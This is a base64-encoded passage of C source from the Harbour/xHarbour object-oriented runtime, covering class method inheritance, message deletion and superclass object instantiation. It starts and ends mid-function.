ICAgICAgICAgICAgICAgICAgIHBOZXdDbHMtPnBNZXRob2RzWyB1aUF0K3VpQnVja2V0IF0u
dWlEYXRhICs9IG5MZW5DbHNEYXRhczsNCg0KICAgICAgICAgICAgICAgICAgICAgaWYoDQog
ICAgICAgICAgICAgICAgICAgICAgICAgcE5ld0Nscy0+cE1ldGhvZHNbIHVpQXQrdWlCdWNr
ZXQgXS5wRnVuY3Rpb24gPT0gIGhiX19fbXNnU2V0RGF0YQ0KICAgICAgICAgICAgICAgICAg
ICAgICAgIHx8DQogICAgICAgICAgICAgICAgICAgICAgICAgcE5ld0Nscy0+cE1ldGhvZHNb
IHVpQXQrdWlCdWNrZXQgXS5wRnVuY3Rpb24gPT0gIGhiX19fbXNnR2V0RGF0YQ0KICAgICAg
ICAgICAgICAgICAgICAgICAgIHx8DQogICAgICAgICAgICAgICAgICAgICAgICAgcE5ld0Ns
cy0+cE1ldGhvZHNbIHVpQXQrdWlCdWNrZXQgXS5wRnVuY3Rpb24gPT0gIGhiX19fbXNnU3Vw
ZXINCiAgICAgICAgICAgICAgICAgICAgICAgKQ0KICAgICAgICAgICAgICAgICAgICAgew0K
ICAgICAgICAgICAgICAgICAgICAgICBwTmV3Q2xzLT5wTWV0aG9kc1sgdWlBdCt1aUJ1Y2tl
dCBdLnVpRGF0YSAgICAgKz0gbkxlbkRhdGFzOw0KICAgICAgICAgICAgICAgICAgICAgfQ0K
DQogICAgICAgICAgICAgICAgICAgICBpZiggcE5ld0Nscy0+cE1ldGhvZHNbIHVpQXQrdWlC
dWNrZXQgXS5wRnVuY3Rpb24gPT0gIGhiX19fbXNnRXZhbElubGluZSApDQogICAgICAgICAg
ICAgICAgICAgICAgICBwTmV3Q2xzLT5wTWV0aG9kc1sgdWlBdCt1aUJ1Y2tldCBdLnVpRGF0
YSArPSBuTGVuSW5saW5lczsNCg0KICAgICAgICAgICAgICAgICAgICAgaWYoICggcFNwckNs
cy0+cE1ldGhvZHNbIHVpIF0udWlTY29wZSAmIEhCX09PX0NMU1RQX1NVUEVSICkgIT0gSEJf
T09fQ0xTVFBfU1VQRVIgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgcE5ld0Nscy0+cE1l
dGhvZHNbIHVpQXQrdWlCdWNrZXQgXS51aVNjb3BlID0gKCBVU0hPUlQgKSAoIHBTcHJDbHMt
PnBNZXRob2RzWyB1aSBdLnVpU2NvcGUgKyBIQl9PT19DTFNUUF9TVVBFUiApOw0KICAgICAg
ICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICAgICAgcE5ld0Nscy0+
cE1ldGhvZHNbIHVpQXQrdWlCdWNrZXQgXS51aVNjb3BlID0gcFNwckNscy0+cE1ldGhvZHNb
IHVpIF0udWlTY29wZTsNCg0KICAgICAgICAgICAgICAgICAgICAgaWYoIHBTcHJDbHMtPnBN
ZXRob2RzWyB1aSBdLnBJbml0VmFsdWUgKQ0KICAgICAgICAgICAgICAgICAgICAgew0KICAg
ICAgICAgICAgICAgICAgICAgICAgUEhCX0lURU0gcEluaXRWYWx1ZTsNCg0KICAgICAgICAg
ICAgICAgICAgICAgICAgaWYoIEhCX0lTX0FSUkFZKCBwU3ByQ2xzLT5wTWV0aG9kc1sgdWkg
XS5wSW5pdFZhbHVlICkgKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgcE5ld0Nscy0+
cE1ldGhvZHNbIHVpQXQgKyB1aUJ1Y2tldCBdLnBJbml0VmFsdWUgPSBoYl9hcnJheUNsb25l
KCBwU3ByQ2xzLT5wTWV0aG9kc1sgdWkgXS5wSW5pdFZhbHVlICk7DQogICAgICAgICAgICAg
ICAgICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAg
ICAgICAgICAgICAgICAgICBwSW5pdFZhbHVlID0gaGJfaXRlbU5ldyggTlVMTCApOw0KDQog
ICAgICAgICAgICAgICAgICAgICAgICAgICBoYl9pdGVtQ29weSggcEluaXRWYWx1ZSwgcFNw
ckNscy0+cE1ldGhvZHNbIHVpIF0ucEluaXRWYWx1ZSApOw0KICAgICAgICAgICAgICAgICAg
ICAgICAgICAgcE5ld0Nscy0+cE1ldGhvZHNbIHVpQXQgKyB1aUJ1Y2tldCBdLnBJbml0VmFs
dWUgPSBwSW5pdFZhbHVlOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAg
ICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAg
ICAgICAgICB9DQogICAgICAgICAgICAgICAgICBlbHNlIGlmKCBwTmV3Q2xzLT5wTWV0aG9k
c1sgdWlBdCArIHVpQnVja2V0IF0ucE1lc3NhZ2UgPT0gcE1zZyApDQogICAgICAgICAgICAg
ICAgICAgICBicmVhazsNCiAgICAgICAgICAgICAgIH0NCg0KICAgICAgICAgICAgICAgLyog
Tm8gc3BhY2UgZm91bmQgZm9yIHRoaXMgbWVzc2FnZSwgY2FsbCBoYl9kaWNyZWFsbG9jKCkg
Ki8NCiAgICAgICAgICAgICAgIGlmICh1aUJ1Y2tldCA9PSBCVUNLRVQpDQogICAgICAgICAg
ICAgICAgew0KICAgICAgICAgICAgICAgICBiUmVzaXplPVRSVUU7DQogICAgICAgICAgICAg
ICAgIHVpQ3VycmVudCA9IHVpIDsNCiAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAg
ICAgICAgICAgfQ0KDQogICAgICAgICAgICB9DQoNCiAgICAgICAgICB9DQoNCiAgICAgICAg
IH0gd2hpbGUgKCB1aSA8IHVpTGltaXQgKTsNCiAgICAgIH0NCiAgIH0NCiAgIGVsc2UNCiAg
IHsNCiAgICAgIHBOZXdDbHMtPnVpRGF0YXMgICAgICA9ICggVVNIT1JUICkgaGJfcGFybmko
IDIgKTsNCiAgICAgIHBOZXdDbHMtPnVpRGF0YUZpcnN0ICA9IDA7DQogICAgICBwTmV3Q2xz
LT51aURhdGFzU2hhcmVkPSAwOw0KDQogICAgICBwTmV3Q2xzLT5wTWV0aG9kcyAgICAgPSAo
IFBNRVRIT0QgKSBoYl94Z3JhYiggQkFTRV9NRVRIT0RTICogc2l6ZW9mKCBNRVRIT0QgKSAp
Ow0KICAgICAgbWVtc2V0KCBwTmV3Q2xzLT5wTWV0aG9kcywgMCwgQkFTRV9NRVRIT0RTICog
c2l6ZW9mKCBNRVRIT0QgKSApOw0KDQogICAgICBwTmV3Q2xzLT51aU1ldGhvZHMgICAgPSAw
Ow0KICAgICAgcE5ld0Nscy0+dWlIYXNoS2V5ICAgID0gSEFTSF9LRVk7DQoNCiAgICAgIHBO
ZXdDbHMtPnBDbGFzc0RhdGFzICA9IGhiX2l0ZW1BcnJheU5ldyggMCApOw0KICAgICAgcE5l
d0Nscy0+cElubGluZXMgICAgID0gaGJfaXRlbUFycmF5TmV3KCAwICk7DQogICAgICBwTmV3
Q2xzLT5wRnVuRXJyb3IgICAgPSBOVUxMOw0KICAgfQ0KICAgaGJfaXRlbVJlbGVhc2UoIHBh
aFN1cGVyICk7DQoNCiAgIGhiX3JldG5pKCArK3NfdWlDbGFzc2VzICk7DQp9DQoNCg0KLyoN
CiAqIF9fY2xzRGVsTXNnKCA8b09iaj4sIDxjTWVzc2FnZT4gKQ0KICoNCiAqIERlbGV0ZSBt
ZXNzYWdlIChvbmx5IGZvciBJTkxJTkUgYW5kIE1FVEhPRCkNCiAqDQogKiA8b09iaj4gICAg
IE9iamVjdA0KICogPGNNZXNzYWdlPiBNZXNzYWdlDQogKi8NCkhCX0ZVTkMoIF9fQ0xTREVM
TVNHICkNCnsNCiAgIFVTSE9SVCB1aUNsYXNzID0gKCBVU0hPUlQgKSBoYl9wYXJuaSggMSAp
Ow0KICAgUEhCX0lURU0gcFN0cmluZyA9IGhiX3BhcmFtKCAyLCBIQl9JVF9TVFJJTkcgKTsN
Cg0KICAgaWYoIHVpQ2xhc3MgJiYgdWlDbGFzcyA8PSBzX3VpQ2xhc3NlcyAmJiBwU3RyaW5n
ICkNCiAgIHsNCiAgICAgIFBIQl9EWU5TIHBNc2cgPSBoYl9keW5zeW1GaW5kTmFtZSggcFN0
cmluZy0+aXRlbS5hc1N0cmluZy52YWx1ZSApOw0KDQogICAgICBpZiggcE1zZyApDQogICAg
ICB7DQogICAgICAgICBQQ0xBU1MgcENsYXNzICA9IHNfcENsYXNzZXMgKyAoIHVpQ2xhc3Mg
LSAxICk7DQogICAgICAgICBVU0hPUlQgdWlNYXNrICA9ICggVVNIT1JUICkgKCBwQ2xhc3Mt
PnVpSGFzaEtleSAqIEJVQ0tFVCApOw0KICAgICAgICAgVVNIT1JUIHVpQXQgICAgPSAoIFVT
SE9SVCApICggKCAoIGhiX2Nsc19Nc2dUb051bSggcE1zZyApICkgJSBwQ2xhc3MtPnVpSGFz
aEtleSApICogQlVDS0VUICk7DQogICAgICAgICBVU0hPUlQgdWlMaW1pdCA9ICggVVNIT1JU
ICkgKCB1aUF0ID8gKCB1aUF0IC0gMSApIDogKCB1aU1hc2sgLSAxICkgKTsNCg0KICAgICAg
ICAgd2hpbGUoICggdWlBdCAhPSB1aUxpbWl0ICkgJiYNCiAgICAgICAgICAgICAgICAoIHBD
bGFzcy0+cE1ldGhvZHNbIHVpQXQgXS5wTWVzc2FnZSAmJg0KICAgICAgICAgICAgICAgICgg
cENsYXNzLT5wTWV0aG9kc1sgdWlBdCBdLnBNZXNzYWdlICE9IHBNc2cgKSApICkNCiAgICAg
ICAgIHsNCiAgICAgICAgICAgIHVpQXQrKzsNCiAgICAgICAgICAgIGlmKCB1aUF0ID09IHVp
TWFzayApDQogICAgICAgICAgICAgICB1aUF0ID0gMDsNCiAgICAgICAgIH0NCiAgICAgICAg
IGlmKCB1aUF0ICE9IHVpTGltaXQgKQ0KICAgICAgICAgeyAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgLyogUmVxdWVzdGVkIG1ldGhvZCBmb3VuZCAgICovDQog
ICAgICAgICAgICBQSEJfRlVOQyBwRnVuYyA9IHBDbGFzcy0+cE1ldGhvZHNbIHVpQXQgXS5w
RnVuY3Rpb247DQoNCiAgICAgICAgICAgIGlmKCBwRnVuYyA9PSBoYl9fX21zZ0V2YWxJbmxp
bmUgKSAgICAgIC8qIElOTElORSBtZXRob2QgZGVsZXRlZCAgICAqLw0KICAgICAgICAgICAg
ew0KICAgICAgICAgICAgICAgaGJfYXJyYXlEZWwoIHBDbGFzcy0+cElubGluZXMsIHBDbGFz
cy0+cE1ldGhvZHNbIHVpQXQgXS51aURhdGEgKTsNCiAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8qIERlbGV0ZSBJTkxJTkUgYmxvY2sgICAg
ICAqLw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgLyogTW92ZSBtZXNzYWdlcyAgICAgICAgICAgICovDQogICAgICAg
ICAgICB3aGlsZSggcENsYXNzLT5wTWV0aG9kc1sgdWlBdCBdLnBNZXNzYWdlICYmIHVpQXQg
IT0gdWlMaW1pdCApDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICBoYl94bWVtY3B5
KCBwQ2xhc3MtPnBNZXRob2RzICsgdWlBdCwNCiAgICAgICAgICAgICAgICAgICAgICAgcENs
YXNzLT5wTWV0aG9kcyArICggKCB1aUF0ID09IHVpTWFzayApID8gMCA6IHVpQXQgKyAxICks
DQogICAgICAgICAgICAgICAgICAgICAgIHNpemVvZiggTUVUSE9EICkgKTsNCiAgICAgICAg
ICAgICAgIHVpQXQrKzsNCiAgICAgICAgICAgICAgIGlmKCB1aUF0ID09IHVpTWFzayApDQog
ICAgICAgICAgICAgICAgICB1aUF0ID0gMDsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAg
IG1lbXNldCggcENsYXNzLT5wTWV0aG9kcyArIHVpQXQsIDAsIHNpemVvZiggTUVUSE9EICkg
KTsNCiAgICAgICAgICAgIHBDbGFzcy0+dWlNZXRob2RzLS07ICAgICAgICAgICAgICAgICAg
ICAvKiBEZWNyZWFzZSBudW1iZXIgbWVzc2FnZXMgKi8NCiAgICAgICAgIH0NCiAgICAgIH0N
CiAgIH0NCn0NCg0KDQovKg0KICogPG9OZXdPYmplY3Q+IDo9IF9fY2xzSW5zdCggPGhDbGFz
cz4gKQ0KICoNCiAqIENyZWF0ZSBhIG5ldyBvYmplY3QgZnJvbSBjbGFzcyBkZWZpbml0aW9u
IDxoQ2xhc3M+DQogKi8NCkhCX0ZVTkMoIF9fQ0xTSU5TVCApDQp7DQogICBQSEJfSVRFTSBw
U2VsZiA7DQoNCiAgIFBIQl9JVEVNICogcHBPYmplY3RzPU5VTEw7DQogICBVU0hPUlQgdWlT
aXplPTA7DQoNCiAgIHBTZWxmID0gaGJfY2xzSW5zdCggKCBVU0hPUlQgKSBoYl9wYXJuaSgg
MSApLCAmcHBPYmplY3RzLCAmdWlTaXplICk7DQoNCiAgIGlmKCBwU2VsZiApDQogICAgICBo
Yl9pdGVtUmVsZWFzZSggaGJfaXRlbVJldHVybiggcFNlbGYgKSApOw0KDQogICBpZiggcHBP
YmplY3RzICkNCiAgICAgIGhiX3hmcmVlKCBwcE9iamVjdHMgKTsNCn0NCg0KDQovKg0KICog
WzxvKFN1cGVyKU9iamVjdD5dIDo9IGhiX2Nsc0luc3QoIDxoQ2xhc3M+LCA8cE9iamVjdHM+
LCA8cHVpU2l6ZT4gKQ0KICoNCiAqIENyZWF0ZSBhIChzdXBlcilvYmplY3QgZnJvbSBjbGFz
cyBkZWZpbml0aW9uIDxoQ2xhc3M+DQogKi8NCnN0YXRpYyBQSEJfSVRFTSBoYl9jbHNJbnN0
KCBVU0hPUlQgdWlDbGFzcywgUEhCX0lURU0gKiAqIHBwT2JqZWN0cywgVVNIT1JUICogcHVp
U2l6ZSApDQp7DQogICBQSEJfSVRFTSBwU2VsZiA9IE5VTEw7DQoNCiAgIGlmKCB1aUNsYXNz
IDw9IHNfdWlDbGFzc2VzICkNCiAgIHsNCiAgICAgIFBDTEFTUyAgIHBDbGFzcyA9IHNfcENs
YXNzZXMgKyAoIHVpQ2xhc3MgLSAxICk7DQogICAgICBQSEJfSVRFTSBwU3ByT2JqLCBwVG1w
Ow0KICAgICAgVVNIT1JUICAgdWlBdDsNCiAgICAgIFVTSE9SVCAgIHVpTGltaXQgPSAoIFVT
SE9SVCApICggcENsYXNzLT51aUhhc2hLZXkgKiBCVUNLRVQgKTsNCiAgICAgIFBNRVRIT0Qg
IHBNZXRoIDsNCg0KICAgICAgcFNlbGYgPSBoYl9pdGVtTmV3KCBOVUxMICk7DQogICAgICBo
Yl9hcnJheU5ldyggcFNlbGYsIHBDbGFzcy0+dWlEYXRhcyApOw0KDQogICAgICBwU2VsZi0+
aXRlbS5hc0FycmF5LnZhbHVlLT51aUNsYXNzICAgPSB1aUNsYXNzOw0KICAgICAgcFNlbGYt
Pml0ZW0uYXNBcnJheS52YWx1ZS0+dWlQcmV2Q2xzID0gMDsNCg0KICAgICAgLyogUGhhc2Ug
SSBJbnN0YW5jaWF0ZSBhbGwgSGVyaXRlZCBvYmplY3QgcmVjdXJzaXZlbHkgICAgICAgICAg
ICAgICAqLw0KICAgICAgLyogQTpCID09PiBvQiAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAqLw0KICAgICAgLyogICBUaGVuICAgIEI6
QyA9PT4gb0MgICAuLi4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAq
Lw0KICAgICAgLyogRG8gbm90IHRyeSB0byB3b3JrIG9uIEE6QyAoaW5oZXJpdGVkIGNsYXNz
IHN1cGVyIG9iamVjdCBmcm9tIEIpICAqLw0KICAgICAgcE1ldGggPSBwQ2xhc3MtPnBNZXRo
b2RzOw0KICAgICAgZm9yKCB1aUF0ID0gMDsgdWlBdCA8IHVpTGltaXQ7IHVpQXQrKywgcE1l
dGgrKyApDQogICAgICB7DQogICAgICAgICBpZiggKCBwTWV0aC0+dWlTY29wZSAmIEhCX09P
X0NMU1RQX0NMQVNTICkgPT0gSEJfT09fQ0xTVFBfQ0xBU1MNCiAgICAgICAgICAgICAgJiYN
CiAgICAgICAgICAgICAoIHBNZXRoLT51aVNjb3BlICYgSEJfT09fQ0xTVFBfU1VQRVIgKSAh
PSBIQl9PT19DTFNUUF9TVVBFUg0KICAgICAgICAgICApDQogICAgICAgICB7DQoNCiAgICAg
ICAgICAgIHBTcHJPYmogPSBoYl9jbHNJbnN0KCBwTWV0aC0+dWlTcHJDbGFzcywgcHBPYmpl
Y3RzLCBwdWlTaXplICk7ICAvKmluc3RhbmNlIHN1cGVyIG9iamVjdCovDQoNCiAgICAgICAg
ICAgIGhiX2FycmF5U2V0KCBwU2VsZiwgcE1ldGgtPnVpRGF0YSwgcFNwck9iaiApOw0KICAg
ICAgICAgICAgaGJfaXRlbVJlbGVhc2UoIHBTcHJPYmogKTsNCg0KICAgICAgICAgICAgKyso
KnB1aVNpemUpOw0KICAgICAgICAgICAgaWYoICpwcE9iamVjdHMgPT0gTlVMTCApDQogICAg
ICAgICAgICAgICAqcHBPYmplY3RzID0gKCBQSEJfSVRFTSAqICkgaGJfeGdyYWIoIHNpemVv
ZiggUEhCX0lURU0gKSApOw0KICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgKnBw
T2JqZWN0cyA9ICggUEhCX0lURU0gKiApIGhiX3hyZWFsbG9jKCAqcHBPYmplY3RzLCAoKnB1
aVNpemUpICogc2l6ZW9mKCBQSEJfSVRFTSApICk7DQoNCiAgICAgICAgICAgIHBUbXAgPSBo
Yl9hcnJheUdldEl0ZW1QdHIoIHBTZWxmLCBwTWV0aC0+dWlEYXRhICk7DQoNCiAgICAgICAg
ICAgICgqcHBPYmplY3RzKVsgKCpwdWlTaXplKSAtIDEgXSA9IHBUbXA7DQoNCiAgICAgICAg
IH0NCiAgICAgIH0NCg0KICAgICAgLyogUGhhc2UgSUkgQ3JlYXRlIGxpbmsgYmV0d2VlbiBB
OkMgYW5kIEE6QjpDICEhICovDQogICAgICAvKiBUaGV5IG11c3QgcG9pbnQgdG8gdGhlIHNh
bWUgb2JqZWN0ICAgICAgICAgICAgKi8NCiAgICAgIHBNZXRoID0gcENsYXNzLT5wTWV0aG9k
czsNCiAgICAgIGZvciggdWlBdCA9IDA7IHVpQXQgPCB1aUxpbWl0OyB1aUF0KyssIHBNZXRo
KysgKQ0KICAgICAgew0KICAgICAgICAgaWYoICggcE1ldGgtPnVpU2NvcGUgJiBIQl9PT19D
TFNUUF9DTEFTUyApID09IEhCX09PX0NMU1RQX0NMQVNTDQogICAgICAgICAgICAgICYmDQog
ICAgICAgICAgICAgKCBwTWV0aC0+dWlTY29wZSAmIEhCX09PX0NMU1RQX1NVUEVSICkgPT0g
SEJfT09fQ0xTVFBfU1VQRVINCiAgICAgICAgICAgKQ0KICAgICAgICAgew0KICAgICAgICAg
ICAgVVNIT1JUIHVpQ250Ow0KDQogICAgICAgICAgICBmb3IoIHVpQ250ID0gMTsgdWlDbnQg
PD0gKCpwdWlTaXplKTsgdWlDbnQrKyApDQogICAgICAgICAgICB7DQogICAgICAgICAgICAg
ICBwVG1wID0gKCpwcE9iamVjdHMpWyB1aUNudCAtIDEgXTsNCg0KICAgICAgICAgICAgICAg
aWYoIHBUbXAtPml0ZW0uYXNBcnJheS52YWx1ZS0+dWlDbGFzcyA9PSBwTWV0aC0+dWlTcHJD
bGFzcyApDQogICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICBoYl9hcnJheVNl
dCggcFNlbGYsIHBNZXRoLT51aURhdGEsIHBUbXAgKTsNCiAgICAgICAgICAgICAgICAgIGJy
ZWFrOw0KICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KDQogICAgICAgICB9DQog
ICAgICB9DQoNCiAgICAgIC8qIFBoYXNlIElJSSBDcmVhdGUgbGluayBiZXR3ZWVuIGluc3Rh
bmNpZWQgb2JqZWN0IGFuZCBTdXBlckRhdGFNZXNzYWdlcyAqLw0KICAgICAgLyogSW5pdGlh
bGlzZSB2YWx1ZSBpZiBpbml0aWFsaXNhdGlvbiB3YXMgcmVxdWVzdGVkICAgICAgICAgICAg
ICAgICAgICAgICovDQogICAgICBwTWV0aCA9IHBDbGFzcy0+cE1ldGhvZHM7DQogICAgICBm
b3IoIHVpQXQgPSAwOyB1aUF0IDwgdWlMaW1pdDsgdWlBdCsrLCBwTWV0aCsrICkNCiAgICAg
IHsNCg0KICAgICAgICAgLyogSW5pdCBDbGFzc2RhdGEgKGluaGVyaXRlZCBhbmQgbm90KSBp
ZiBuZWVkZWQgKi8NCiAgICAgICAgIGlmKCBwTWV0aC0+cEluaXRWYWx1ZSAmJiBwTWV0aC0+
cEZ1bmN0aW9uID09IGhiX19fbXNnR2V0Q2xzRGF0YSAmJiAhKCBwTWV0aC0+YkNsc0RhdGFJ
bml0aWF0ZWQgKSApDQogICAgICAgICB7DQogICAgICAgICAgICBIQl9JVEVNIGluaXQ7DQog
ICAgICAgICAgICBQSEJfSVRFTSBwSW5pdDsNCg0KICAgICAgICAgICAgaGJfYXJyYXlHZXQo
IHBDbGFzcy0+cENsYXNzRGF0YXMsIHBNZXRoLT51aURhdGEsICZpbml0ICk7DQogICAgICAg
ICAgICBpZiggaW5pdC50eXBlID09IEhCX0lUX05JTCApDQogICAgICAgICAgICB7DQoNCiAg
ICAgICAgICAgICAgIGlmKCBIQl9JU19BUlJBWSggcE1ldGgtPnBJbml0VmFsdWUgKSApDQog
ICAgICAgICAgICAgICAgcEluaXQgPSBoYl9hcnJheUNsb25lKCBwTWV0aC0+cEluaXRWYWx1
ZSApOw0KICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgew0KICAgICAgICAg
ICAgICAgICAgIHBJbml0ID0gaGJfaXRlbU5ldyggTlVMTCApOw0KICAgICAgICAgICAgICAg
ICAgIGhiX2l0ZW1Db3B5KCBwSW5pdCwgcE1ldGgtPnBJbml0VmFsdWUgKTsNCiAgICAgICAg
ICAgICAgIH0NCg0KICAgICAgICAgICAgICAgaGJfYXJyYXlTZXQoIHBDbGFzcy0+cENsYXNz
RGF0YXMsIHBNZXRoLT51aURhdGEsIHBJbml0ICk7DQogICAgICAgICAgICAgICBoYl9pdGVt
UmVsZWFzZShwSW5pdCk7DQogICAgICAgICAgICAgICBwTWV0aC0+YkNsc0RhdGFJbml0aWF0
ZWQgPSAxOw0KDQogICAgICAgICAgICB9DQogICAgICAgICAgICBoYl9pdGVtQ2xlYXIoICZp
bml0ICk7DQogICAgICAgICB9DQoNCiAgICAgICAgIGlmKCAoIHBNZXRoLT51aVNjb3BlICYg
SEJfT09fQ0xTVFBfU1VQRVIgKSA9PSBIQl9PT19DTFNUUF9TVVBFUiApDQogICAgICAgICB7
DQogICAgICAgICAgICBpZiggcE1ldGgtPnBGdW5jdGlvbiA9PSBoYl9fX21zZ0dldERhdGEg
KQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgVVNIT1JUIHVpQ250Ow0KDQogICAg
ICAgICAgICAgICBmb3IoIHVpQ250ID0gMTsgdWlDbnQgPD0gKCpwdWlTaXplKTsgdWlDbnQr
KyApDQogICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICBwVG1wID0gKCpwcE9i
amVjdHMpWyB1aUNudCAtIDEgXTsNCg0KICAgICAgICAgICAgICAgICAgaWYoIHBUbXAtPml0
ZW0uYXNBcnJheS52YWx1ZS0+dWlDbGFzcyA9PSBwTWV0aC0+dWlTcHJDbGFzcyApDQogICAg
ICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICBVU0hPUlQgdWksIHVpQnVj
a2V0Ow0KICAgICAgICAgICAgICAgICAgICAgUEhCX0RZTlMgcE1zZzsNCiAgICAgICAgICAg
ICAgICAgICAgIFBDTEFTUyBwU3ByQ2xzOw0KICAgICAgICAgICAgICAgICAgICAgUEhCX0lU
RU0gcERhdGFIcnRkOw0KDQogICAgICAgICAgICAgICAgICAgICBwTXNnID0gKCBQSEJfRFlO
UyApIHBNZXRoLT5wTWVzc2FnZTsNCg0KICAgICAgICAgICAgICAgICAgICAgcFNwckNscyA9
IHNfcENsYXNzZXMgKyAoIHBNZXRoLT51aVNwckNsYXNzIC0gMSApOw0KDQogICAgICAgICAg
ICAgICAgICAgICB1aSA9ICggVVNIT1JUICkgKCAoICggaGJfY2xzX01zZ1RvTnVtKCBwTXNn
ICkgKSAlIHBTcHJDbHMtPnVpSGFzaEtleSApICogQlVDS0VUICk7DQoNCiAgICAgICAgICAg
ICAgICAgICAgIGZvciggdWlCdWNrZXQgPSAwOyB1aUJ1Y2tldCA8IEJVQ0tFVDsgdWlCdWNr
ZXQrKyApDQogICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAg
ICBpZiggcE1zZyA9PSBwU3ByQ2xzLT5wTWV0aG9kc1sgdWkrdWlCdWNrZXQgXS5wTWVzc2Fn
ZSAvKnN0cmNtcCggcE1zZy0+cFN5bWJvbC0+c3pOYW1lLCBwU3ByQ2xzLT5wTWV0aG9kc1sg
dWkrdWlCdWNrZXQgXS5wTWVzc2FnZS0+cFN5bWJvbC0+c3pOYW1lICkgPT0gMCovICkNCiAg
ICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgICAgICAg
fQ0KDQogICAgICAgICAgICAgICAgICAgICBwRGF0YUhydGQgPSAoIFBIQl9JVEVNICkgaGJf
YXJyYXlHZXRJdGVtUHRyKCBwVG1wLCBwU3ByQ2xzLT5wTWV0aG9kc1sgdWkrdWlCdWNrZXQg
XS51aURhdGEgKTsNCg0KICAgICAgICAgICAgICAgICAgICAgaGJfYXJyYXlTZXQoIHBTZWxm
LCBwTWV0aC0+dWlEYXRhLCBwRGF0YUhydGQgKTsNCiAgICAgICAgICAgICAgICAgICAgIGJy
ZWFrOw0KDQogICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICB9DQogICAgICAg
ICAgICB9DQogICAgICAgICB9DQogICAgICAgICBlbHNlIGlmKCBwTWV0aC0+cEluaXRWYWx1
ZSApDQogICAgICAgICB7DQogICAgICAgICAgICBpZiggcE1ldGgtPnBGdW5jdGlvbiA9PSBo
Yl9fX21zZ0dldERhdGEgKSAvKiBpcyBhIERBVEEgYnV0IG5vdCBoZXJpdGVkICovDQogICAg
ICAgICAgICB7DQogICAgICAgICAgICAgICBQSEJfSVRFTSBwSW5pdFZhbHVlIDsNCg0KICAg
ICAgICAgICAgICAgaWYoIEhCX0lTX0FSUkFZKCBwTWV0aC0+cEluaXRWYWx1ZSApICkNCiAg
ICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgIHBJbml0VmFsdWUgPSBoYl9hcnJh
eUNsb25lKCBwTWV0aC0+cEluaXRWYWx1ZSApOw0KICAgICAgICAgICAgICAgfQ0KICAgICAg
ICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgcElu
aXRWYWx1ZSA9IGhiX2l0ZW1OZXcoIE5VTEwgKTsNCiAgICAgICAgICAgICAgICAgIGhiX2l0
ZW1Db3B5KHBJbml0VmFsdWUsICBwTWV0aC0+cEluaXRWYWx1ZSApOw0KICAgICAgICAgICAg
ICAgfQ0KDQogICAgICAgICAgICAgICBoYl9hcnJheVNldCggcFNlbGYsIHBNZXRoLT51aURh
dGEsIHBJbml0VmFsdWUgKTsNCiAgICAgICAgICAgICAgIGhiX2l0ZW1SZWxlYXNlKCBwSW5p
dFZhbHVlICk7DQoNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGVsc2UgaWYoIHBNZXRo
LT5wRnVuY3Rpb24gPT0gaGJfX19tc2dHZXRTaHJEYXRhICYmICEoIHBNZXRoLT5iQ2xzRGF0
YUluaXRpYXRlZCApICkNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgIC8qIEluaXQg
U2hhcmVkIENsYXNzZGF0YSBhcyBuZWVkZWQsIHdlIG9ubHkgbmVlZCB0byBpbml0IHRoZSBm
aXJzdCAqLw0KICAgICAgICAgICAgICAgLyogbm90IGluaGVyaXRlZCBjbGFzc2RhdGEgYXJy
YXkgd2hlcmUgYWxsIHNoYXJlZCB3aWxsIHBvaW50IHRvICAgICovDQogICAgICAgICAgICAg
ICBIQl9JVEVNIGluaXQ7DQogICAgICAgICAgICAgICBQSEJfSVRFTSBwSW5pdDsNCg0KICAg
ICAgICAgICAgICAgaGJfYXJyYXlHZXQoIHBDbGFzcy0+cENsYXNzRGF0YXMsIHBNZXRoLT51
aURhdGEsICZpbml0ICk7DQogICAgICAgICAgICAgICBpZiggaW5pdC50eXBlID09IEhCX0lU
X05JTCApDQogICAgICAgICAgICAgICB7DQoNCiAgICAgICAgICAgICAgICAgIGlmKCBIQl9J
U19BUlJBWSggcE1ldGgtPnBJbml0VmFsdWUgKSApDQogICAgICAgICAgICAgICAgICAgcElu
aXQgPSBoYl9hcnJheUNsb25lKCBwTWV0aC0+cEluaXRWYWx1ZSApOw0KICAgICAgICAgICAg
ICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgIHBJ
bml0ID0gaGJfaXRlbU5ldyggTlVMTCApOw0KICAgICAgICAgICAgICAgICAgIGhiX2l0ZW1D
b3B5KCBwSW5pdCwgcE1ldGgtPnBJbml0VmFsdWUgKTsNCiAgICAgICAgICAgICAgICAgIH0N
